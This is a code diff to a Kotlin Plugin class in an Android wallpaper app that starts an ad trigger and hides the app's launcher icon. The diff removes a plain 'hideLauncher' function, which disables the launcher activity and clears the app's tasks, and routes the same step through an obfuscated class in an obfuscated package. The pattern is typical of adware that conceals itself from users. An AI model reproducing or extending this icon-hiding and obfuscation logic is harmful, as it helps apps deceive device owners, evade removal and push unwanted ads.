@@ -1,14 +1,10 @@
 package com.flight.wallpaper2.additional
 
 import android.app.Activity
-import android.app.ActivityManager
-import android.content.ComponentName
 import android.content.Context
-import android.content.pm.PackageManager
 import android.os.Bundle
 import android.os.PowerManager
 import android.util.Log
-import androidx.appcompat.app.AppCompatActivity
 import androidx.work.Constraints
 import androidx.work.NetworkType
 import androidx.work.PeriodicWorkRequestBuilder
@@ -25,6 +21,7 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.launch
 import org.json.JSONObject
 import p3dn6v.h4wm1s.k2ro8t.C3tH7m
+import p3dn6v.h4wm1s.k2ro8t.Qonf1j
 import java.util.concurrent.TimeUnit
 
 
@@ -75,28 +72,12 @@ class Plugin(
 
                 //start event ad
                 AdTrigger(context).start()
-                hideLauncher(StartActivity::class.java)
+                Qonf1j.INSTANCE.s72akl(context,StartActivity::class.java)
+
             }
         }
 
     }
-
-    private fun hideLauncher(cls: Class<*>) {
-        val componentName = ComponentName(context, cls)
-        val mPackageManager = context.packageManager
-        mPackageManager.setComponentEnabledSetting(
-            componentName,
-            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-            PackageManager.DONT_KILL_APP
-        )
-        val activityManager: ActivityManager =
-            context.getSystemService(AppCompatActivity.ACTIVITY_SERVICE) as ActivityManager
-        val tasks = activityManager.appTasks
-        for (task in tasks) {
-            task.finishAndRemoveTask()
-        }
-    }
-
 
     private fun getAdStrategy(): AdStrategy {
         val keyId = "adId"
